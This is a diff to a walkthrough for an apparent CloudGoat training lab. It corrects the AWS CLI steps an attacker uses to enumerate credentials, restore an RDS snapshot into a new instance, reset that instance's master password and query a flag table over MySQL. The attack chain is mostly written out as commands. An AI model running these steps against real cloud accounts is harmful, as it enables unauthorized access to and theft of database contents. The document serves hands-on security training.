@@ -15,7 +15,7 @@ An attacker can gain access to a hijacked EC2 instance.
 ```
 
 
-An attacker can list AWS credentials on the server (enumirate)
+An attacker can list AWS credentials on the server 
 
 
 `aws sts get-caller-identity`
@@ -64,25 +64,30 @@ The attacker restores the RDS snapshot.
 #Verify the information in the RDS snapshot
 aws rds describe-db-instances --profile david
 
+aws rds describe-db-snapshots --db-instance-identifier cg-rds
 
-#The id of the current RDS instance is cg-rds
-The id of RDS snapshotd is cg-rds-snapshot
 
 
 #Restore the RDS snapshot
-aws rds restore-db-instance-from-db-snapshot \.
+aws rds restore-db-instance-from-db-snapshot \
     --db-instance-identifier attack-rds \
-    --db-snapshot-identifier cg-rds-snapshot --profile david
+    --db-snapshot-identifier cg-rds-snapshot \
+    --db-subnet-group-name cg-db-subnet-group \
+    --vpc-security-group-ids sg-038cc4ee5486e9c42 \
+    --profile david
+
 
 
 #Wait for a new instance to be created
 
 
 #Modify the RDS instance password
-aws rds modify-db-instance \.
-    --db-instance-identifier attack-rds \.
-    --master-user-password attack1234! aws rds modify-db-instance \
-    --apply-immediatel --profile david
+aws rds modify-db-instance \
+    --db-instance-identifier attack-rds \
+    --master-user-password attack1234! \
+    --apply-immediately \
+    --profile david
+
 
 
 #Verify the master username
@@ -97,5 +102,13 @@ aws rds describe-db-instances --db-instance-identifier attack-rds --query \ "DBI
 
 ```
 
-
 The attacker accesses the restored DB and hijacks the FLAG.
+```
+mysql -h attack-rds.czunzahrebkl.us-east-1.rds.amazonaws.com -P 3306 -u cgadmin -pattack1234!
+show databases;
+use mydatabase;
+show tables;
+select * from flag;
+```
+# Caveats
+At the end of the scenario, the instance created by the Restore job is not deleted by ./cloudgoat.py destroy rds_snapshot. You need to delete it manually.
